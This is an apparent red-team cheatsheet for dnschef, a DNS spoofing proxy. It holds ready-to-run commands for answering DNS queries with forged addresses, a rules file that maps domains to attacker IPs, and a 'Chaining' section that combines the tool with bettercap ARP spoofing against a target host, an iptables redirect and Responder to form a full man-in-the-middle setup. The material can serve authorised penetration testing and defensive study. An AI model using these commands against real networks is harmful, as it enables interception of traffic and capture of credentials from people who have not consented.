---
title: "dnschef - Quick Reference Cheatsheet"
description: "Quick reference card for dnschef DNS proxy tool"
mitre_tactic: discovery
mitre_tactic_id: TA0007
mitre_subcategory: network_sniffing
tags: [dnschef, dns-spoofing, cheatsheet, dns-proxy, mitm]
---

# dnschef — Cheatsheet

## Quick Start

```bash
# Install
sudo apt install dnschef

# Basic DNS spoofing
sudo dnschef --interface 192.168.1.1 --fakeip 192.168.1.200

# Spoof specific domain
sudo dnschef --interface 192.168.1.1 --fakeip 192.168.1.200 --fakedomain evil.com

# With logging
sudo dnschef --interface 192.168.1.1 --fakeip 192.168.1.200 --logfile dns.log
```

## Core Commands

| Command | Description |
|---------|-------------|
| `sudo dnschef -i 192.168.1.1 --fakeip 192.168.1.200` | Spoof all to single IP |
| `sudo dnschef -i 192.168.1.1 --fakeip IP --fakedomain DOMAIN` | Spoof specific domain |
| `sudo dnschef -i 192.168.1.1 --file rules.ini` | Use rules file |
| `sudo dnschef -i 192.168.1.1 --quiet` | Quiet mode |

## Common Flags

| Flag | Description |
|------|-------------|
| `-i` | Interface to bind |
| `--fakeip` | Fake IPv4 address |
| `--fakeipv4` | Fake IPv4 (alias) |
| `--fakeaaaa` | Fake IPv6 address |
| `--fakedomain` | Domain(s) to spoof |
| `--fakemx` | Fake MX record |
| `--fakecname` | Fake CNAME record |
| `--faketxt` | Fake TXT record |
| `--fakens` | Fake NS record |
| `--nameserver` | Upstream DNS server |
| `--file` | Rules file |
| `--logfile` | Log file |
| `--quiet` | Suppress output |

## Examples

```bash
# Spoof all DNS to one IP
sudo dnschef -i 192.168.1.1 --fakeip 192.168.1.200

# Spoof specific domains
sudo dnschef -i 192.168.1.1 --fakeip 192.168.1.200 \
    --fakedomain "evil.com,phishing.com,malicious.com"

# Multiple record types
sudo dnschef -i 192.168.1.1 \
    --fakeipv4 192.168.1.200 \
    --fakeaaaa ::1 \
    --fakemx mail.evil.com \
    --fakedomain evil.com

# With custom upstream DNS
sudo dnschef -i 192.168.1.1 --fakeip 192.168.1.200 --nameserver 8.8.8.8

# Quiet mode with logging
sudo dnschef -i 192.168.1.1 --fakeip 192.168.1.200 --quiet --logfile /tmp/dns.log

# Using rules file
sudo dnschef -i 192.168.1.1 --file /tmp/rules.ini

# Redirect to localhost (for analysis)
sudo dnschef -i 192.168.1.1 --fakeip 127.0.0.1 --fakedomain "c2.evil.com"
```

## Rules File Format

```ini
# rules.ini
[DNS]
evil.com = 192.168.1.200
malicious.com = 192.168.1.201

[MX]
evil.com = mail.evil.com

[CNAME]
www.evil.com = attacker.com

[TXT]
evil.com = v=spf1 include:evil.com ~all
```

## Chaining

```bash
# dnschef + bettercap (ARP spoof + DNS)
sudo bettercap -iface eth0 -eval "
set arp.spoof.fullduplex true;
set arp.spoof.targets 192.168.1.100;
arp.spoof on;" &

sudo dnschef -i 192.168.1.1 --fakeip 192.168.1.200 --fakedomain "evil.com" &
wait

# dnschef + iptables (transparent redirect)
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 5353
sudo dnschef -i 0.0.0.0 --port 5353 --fakeip 192.168.1.200

# dnschef + responder
sudo dnschef -i eth0 --fakeip 192.168.1.200 &
sudo responder -I eth0 -wrf &
wait
```

## Verification

```bash
# Test DNS spoofing
dig @192.168.1.1 evil.com
dig @192.168.1.1 evil.com AAAA
dig @192.168.1.1 evil.com MX

# Monitor queries
sudo tcpdump -i eth0 port 53 -nn

# Check for spoofed responses
nslookup evil.com 192.168.1.1
```

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Permission denied | Run with sudo |
| Address in use | Stop systemd-resolved: `sudo systemctl stop systemd-resolved` |
| Queries not intercepted | Configure client DNS or use iptables redirect |
| Spoofing not working | Check domain spelling, use `--verbose` |
| High CPU usage | Use `--quiet` mode, check for DNS loops |
